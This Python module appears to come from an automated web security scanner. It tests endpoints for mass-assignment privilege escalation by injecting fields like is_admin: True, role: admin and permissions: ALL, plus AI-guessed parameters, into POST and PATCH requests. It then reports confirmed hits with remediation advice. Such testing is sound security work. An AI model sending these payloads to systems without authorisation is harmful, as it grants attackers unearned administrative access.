import copy

# Hybrid AI Engine
from backend.ai.cortex import get_cortex_engine
from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, TaskTarget, Vulnerability

# HIGH-07: Lazy-init cortex to avoid import-time failures
_cortex = None


def _get_cortex():
    global _cortex
    if _cortex is None:
        _cortex = get_cortex_engine()
    return _cortex


class TheEscalator(BaseArsenalModule):
    """
    MODULE: THE ESCALATOR
    Logic: Privilege Escalation (Mass Assignment).
    Cyber-Organism Protocol: Dictionary Merging & JSON Patching.
    """

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        target = packet.target
        # Default payloads for dictionary merging
        payloads = [{"is_admin": True}, {"role": "admin"}, {"groups": ["root", "admin"]}, {"permissions": "ALL"}]

        # HYBRID AI: Add AI-guessed privilege parameters
        ai_params = await _get_cortex().guess_privilege_params(target.url, target.payload)
        for p in ai_params:
            if isinstance(p, dict) and p not in payloads:
                payloads.append(p)

        targets = []
        for vector in payloads:
            # FIX-054: Use deep copy to prevent mutation of original payload
            merged_payload = copy.deepcopy(target.payload) if target.payload else {}
            merged_payload.update(vector)
            targets.append(TaskTarget(url=target.url, method="POST", headers=target.headers, payload=merged_payload))
            targets.append(TaskTarget(url=target.url, method="PATCH", headers=target.headers, payload=merged_payload))

        return targets

    async def analyze_responses(
        self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket
    ) -> list[Vulnerability]:
        """Confirm mass assignment with >= 2 independent signals (Architecture §9.3)."""
        from backend.modules.evidence import logic_confirm

        vulns = []
        for target, text in interactions:
            if not isinstance(text, str):
                continue
            # Reflected privilege value (e.g. the injected role) is a strong signal.
            reflected = None
            if isinstance(target.payload, dict):
                for key in ("role", "is_admin", "permissions"):
                    if key in target.payload:
                        reflected = str(target.payload[key])
                        break
            ev = logic_confirm(text, positive_markers=["admin", "role", "elevated", "granted"], reflected=reflected)
            if ev.verified:
                meth = target.method
                severity = "CRITICAL" if meth == "PATCH" else "HIGH"
                vulns.append(
                    Vulnerability(
                        name=f"Mass Assignment ({meth})",
                        severity=severity,
                        description=f"Accepted {target.payload} via {meth}",
                        evidence=f"Payload {target.payload}. {ev.summary}",
                        remediation="Use explicit DTOs and block arbitrary model bindings.",
                    )
                )
        return vulns
